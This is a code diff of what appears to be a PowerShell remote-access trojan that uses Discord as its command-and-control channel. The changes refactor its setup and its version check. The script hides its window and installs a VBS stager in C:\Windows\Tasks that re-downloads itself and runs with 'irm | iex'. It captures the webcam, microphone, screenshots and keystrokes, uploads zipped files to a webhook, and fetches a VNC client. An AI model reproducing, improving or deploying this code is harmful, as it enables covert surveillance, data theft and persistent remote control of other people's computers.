@@ -1,4 +1,3 @@
-
 # =====================================================================================================================================================
 <#
 **SETUP**
@@ -21,15 +20,16 @@
 $global:token = "$tk" # make sure your bot is in ONE server only
 # =============================================================== SCRIPT SETUP =========================================================================
 
-$HideConsole = 1 # HIDE THE WINDOW - Change to 1 to hide the console window while running
-$spawnChannels = 1 # Create new channel on session start
-$InfoOnConnect = 1 # Generate client info message on session start
-$defaultstart = 0 # Option to start all jobs automatically upon running
+$HideConsole = $false # HIDE THE WINDOW
+$spawnChannels = $true # Create new channel on session start
+$InfoOnConnect = $true # Generate client info message on session start
+$defaultstart = $false # Option to start all jobs automatically upon running
+$PreDownloadFFMPEG = $false # Option to download FFMPEG from the start
 $global:parent = "https://is.gd/PnLoPI" # parent script URL (for restarts and persistance)
 
 # remove restart stager (if present)
 if(Test-Path "C:\Windows\Tasks\service.vbs"){
-    $InfoOnConnect = 0
+    $InfoOnConnect = $false
     rm -path "C:\Windows\Tasks\service.vbs" -Force
 }
 $version = "1.5.1" # Check version number
@@ -62,6 +62,18 @@ Function GetFfmpeg{
     }
 }
 
+# Get BotId
+Function Get-BotUserId {
+    $headers = @{
+        'Authorization' = "Bot $token"
+    }
+    $wc = New-Object System.Net.WebClient
+    $wc.Headers.Add("Authorization", $headers.Authorization)
+    $botInfo = $wc.DownloadString("https://discord.com/api/v10/users/@me")
+    $botInfo = $botInfo | ConvertFrom-Json
+    return $botInfo.id
+}
+
 # Create a new category for text channels function
 Function NewChannelCategory{
     $headers = @{
@@ -79,7 +91,7 @@ Function NewChannelCategory{
         sleep 3
     }
     $uri = "https://discord.com/api/guilds/$guildID/channels"
-    $randomLetters = -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
+    #$randomLetters = -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
     $body = @{
         "name" = "$env:COMPUTERNAME"
         "type" = 4
@@ -107,7 +119,7 @@ param([string]$name)
         $guildID = $guild.id
     }
     $uri = "https://discord.com/api/guilds/$guildID/channels"
-    $randomLetters = -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
+    #$randomLetters = -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
     $body = @{
         "name" = "$name"
         "type" = 0
@@ -646,7 +658,7 @@ Function AddPersistance{
         sleep 1
         Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
         }
-		#CAN THE -FILE BELOW BE CHANGED TO $newScriptPath
+		# NOTE - CAN THE -FILE BELOW BE CHANGED TO $newScriptPath
     $tobat = @'
 Set objShell = CreateObject("WScript.Shell")
 objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""%APPDATA%\Microsoft\Windows\PowerShell\copy.ps1""", 0, True
@@ -725,7 +737,7 @@ param ([string[]]$Path)
             $tempZipFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), [System.IO.Path]::GetFileName($path))
             Add-Type -AssemblyName System.IO.Compression.FileSystem
             [System.IO.Compression.ZipFile]::CreateFromDirectory($path, $tempZipFilePath)
-            curl.exe -F file1=@"$tempZipFilePath" $hookurl | Out-Null
+            curl.exe -F file1="$tempZipFilePath" $hookurl | Out-Null
             sleep 1
             Rm -Path $tempZipFilePath -Recurse -Force
         }else{
@@ -761,7 +773,8 @@ Function StartUvnc{
 
     sendMsg -Message ":arrows_counterclockwise: ``Starting UVNC Client..`` :arrows_counterclockwise:"
     $tempFolder = "$env:temp\vnc"
-    $vncDownload = "https://github.com/wormserv/assets/raw/main/winvnc.zip"
+    # NOTE - THIS URL NEEDS TO BE MOVED
+	$vncDownload = "https://github.com/wormserv/assets/raw/main/winvnc.zip"
     $vncZip = "$tempFolder\winvnc.zip" 
     if (!(Test-Path -Path $tempFolder)) {
         New-Item -ItemType Directory -Path $tempFolder | Out-Null
@@ -1448,6 +1461,10 @@ $audiojob = {
     $id1 = [audio]::GetDefault(1)
     $MicName = "$(getFriendlyName $id1)"
     while($true){
+        $Path = "$env:Temp\ffmpeg.exe"
+        If (!(Test-Path $Path)){  
+            GetFfmpeg
+        }
         .$env:Temp\ffmpeg.exe -f dshow -i audio="$MicName" -t 60 -c:a libmp3lame -ar 44100 -b:a 128k -ac 1 $outputFile
         sendFile -sendfilePath $outputFile | Out-Null
         sleep 1
@@ -1473,6 +1490,10 @@ $screenJob = {
         }
     }
     while($true){
+        $Path = "$env:Temp\ffmpeg.exe"
+        If (!(Test-Path $Path)){  
+            GetFfmpeg
+        }
         $mkvPath = "$env:Temp\Screen.jpg"
         .$env:Temp\ffmpeg.exe -f gdigrab -i desktop -frames:v 1 -vf "fps=1" $mkvPath
         sendFile -sendfilePath $mkvPath | Out-Null
@@ -1503,6 +1524,10 @@ $camJob = {
     $Input = (Get-CimInstance Win32_PnPEntity | ? {$_.PNPClass -eq 'Camera'} | select -First 1).Name
     if (!($input)){$Input = (Get-CimInstance Win32_PnPEntity | ? {$_.PNPClass -eq 'Image'} | select -First 1).Name}
     while($true){
+        $Path = "$env:Temp\ffmpeg.exe"
+        If (!(Test-Path $Path)){  
+            GetFfmpeg
+        }
         .$env:Temp\ffmpeg.exe -f dshow -i video="$Input" -frames:v 1 -y $imagePath
         sendFile -sendfilePath $imagePath | Out-Null
         sleep 5
@@ -1534,7 +1559,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     $adminperm = "True"
 }
 
-if ($InfoOnConnect -eq '1'){
+if ($InfoOnConnect){
     $infocall = ':hourglass: Getting system info - please wait.. :hourglass:'
 }
 else{
@@ -1558,68 +1583,11 @@ $infocall
 }
 sendMsg -Embed $jsonPayload
 
-    if ($InfoOnConnect -eq '1'){
+    if ($InfoOnConnect){
  	    quickInfo
     }
     else{}
 }
-
-# ------------------------  FUNCTION CALLS + SETUP  ---------------------------
-# Hide the console
-If ($hideconsole -eq 1){ 
-    HideWindow
-}
-Function Get-BotUserId {
-    $headers = @{
-        'Authorization' = "Bot $token"
-    }
-    $wc = New-Object System.Net.WebClient
-    $wc.Headers.Add("Authorization", $headers.Authorization)
-    $botInfo = $wc.DownloadString("https://discord.com/api/v10/users/@me")
-    $botInfo = $botInfo | ConvertFrom-Json
-    return $botInfo.id
-}
-$global:botId = Get-BotUserId
-# Create category and new channels
-NewChannelCategory
-sleep 1
-NewChannel -name 'session-control'
-$global:SessionID = $ChannelID
-$global:ch = $ChannelID
-sleep 1
-NewChannel -name 'screenshots'
-$global:ScreenshotID = $ChannelID
-sleep 1
-NewChannel -name 'webcam'
-$global:WebcamID = $ChannelID
-sleep 1
-NewChannel -name 'microphone'
-$global:MicrophoneID = $ChannelID
-sleep 1
-NewChannel -name 'keycapture'
-$global:keyID = $ChannelID
-sleep 1
-NewChannel -name 'loot-files'
-$global:LootID = $ChannelID
-sleep 1
-NewChannel -name 'powershell'
-$global:PowershellID = $ChannelID
-sleep 1
-# Download ffmpeg to temp folder
-$Path = "$env:Temp\ffmpeg.exe"
-If (!(Test-Path $Path)){  
-    GetFfmpeg
-}
-# Opening info message
-ConnectMsg
-# Start all functions upon running the script
-If ($defaultstart -eq 1){ 
-    StartAll
-}
-# Send setup complete message to discord
-sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME Setup Complete!`` :white_check_mark:"
-
-# ---------------------------------------------------------------------------------------------------------------------------------------------------------
 
 Function CloseMsg {
 $script:jsonPayload = @{
@@ -1642,20 +1610,19 @@ sendMsg -Embed $jsonPayload
 }
 
 Function VersionCheck {
-	#CAN THE VERSION CHECK BE MADE DIFFERENTLY?
-    $versionCheck = irm -Uri "https://pastebin.com/raw/3axupAKL"
+    $versionCheck = irm -Uri "https://is.gd/UBn6Co"
     $VBpath = "C:\Windows\Tasks\service.vbs"
     if (Test-Path "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"){
-    Write-Output "Persistance Installed - Checking Version.."
+		Write-Output "Persistance Installed - Checking Version.."
         if (!($version -match $versionCheck)){
             Write-Output "Newer version available! Downloading and Restarting"
             RemovePersistance
             AddPersistance
-			#SEE IF THIS CAN CHANGE TOO TO MATCH HOW TO RUN THE PROGRAM
+			# NOTE - SEE IF THIS CAN CHANGE TOO TO MATCH HOW TO RUN THE PROGRAM
             $tobat = @"
 Set WshShell = WScript.CreateObject(`"WScript.Shell`")
 WScript.Sleep 200
-WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$ch='$chan'; `$tk='$token'; irm https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1 | iex`", 0, True
+WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$ch='$chan'; `$tk='$token'; irm $parent | iex`", 0, True
 "@
             $tobat | Out-File -FilePath $VBpath -Force
             sleep 1
@@ -1665,9 +1632,61 @@ WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$ch='$chan'; `$tk='
     }
 }
 
-# =============================================================== MAIN LOOP =========================================================================
+# ------------------------  FUNCTION CALLS + SETUP  ---------------------------
+# Hide the console
+If ($hideconsole){ 
+    HideWindow
+}
+ 
+$global:botId = Get-BotUserId
+
+# Create category and new channels
+if ($spawnChannels) {
+    NewChannelCategory
+    sleep 1
+    NewChannel -name 'session-control'
+    $global:SessionID = $ChannelID
+    $global:ch = $ChannelID
+    sleep 1
+    NewChannel -name 'screenshots'
+    $global:ScreenshotID = $ChannelID
+    sleep 1
+    NewChannel -name 'webcam'
+    $global:WebcamID = $ChannelID
+    sleep 1
+    NewChannel -name 'microphone'
+    $global:MicrophoneID = $ChannelID
+    sleep 1
+    NewChannel -name 'keycapture'
+    $global:keyID = $ChannelID
+    sleep 1
+    NewChannel -name 'loot-files'
+    $global:LootID = $ChannelID
+    sleep 1
+    NewChannel -name 'powershell'
+    $global:PowershellID = $ChannelID
+    sleep 1
+}
+# Pre-Download ffmpeg to temp folder
+if ($PreDownloadFFMPEG){
+    $Path = "$env:Temp\ffmpeg.exe"
+    If (!(Test-Path $Path)){  
+        GetFfmpeg
+    }
+}
+# Opening info message
+ConnectMsg
+
+# Start all functions upon running the script
+If ($defaultstart){ 
+    StartAll
+}
+# Send setup complete message to discord
+sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME Setup Complete!`` :white_check_mark:"
 
 VersionCheck
+
+# =============================================================== MAIN LOOP =========================================================================
 
 while ($true) {
 
@@ -1685,12 +1704,12 @@ while ($true) {
     if ($latestMessageId -ne $lastMessageId) {
         $lastMessageId = $latestMessageId
         $global:latestMessageContent = $messages
-        $camrunning = Get-Job -Name Webcam
-        $sceenrunning = Get-Job -Name Screen
-        $audiorunning = Get-Job -Name Audio
-        $PSrunning = Get-Job -Name PSconsole
-        $lootrunning = Get-Job -Name Info
-        $keysrunning = Get-Job -Name Keys
+        $camrunning = Get-Job -Name Webcam -ErrorAction Continue
+        $sceenrunning = Get-Job -Name Screen -ErrorAction Continue
+        $audiorunning = Get-Job -Name Audio -ErrorAction Continue
+        $PSrunning = Get-Job -Name PSconsole -ErrorAction Continue
+        $lootrunning = Get-Job -Name Info -ErrorAction Continue
+        $keysrunning = Get-Job -Name Keys -ErrorAction Continue
         if ($messages -eq 'webcam'){
             if (!($camrunning)){
                 Start-Job -ScriptBlock $camJob -Name Webcam -ArgumentList $global:token, $global:WebcamID
@@ -1747,6 +1766,7 @@ while ($true) {
             sendMsg -Message ":no_entry: ``Stopped All Jobs! : $env:COMPUTERNAME`` :no_entry:"   
         }
         if ($messages -eq 'close'){
+            CleanUp
             CloseMsg
             sleep 2
             exit      
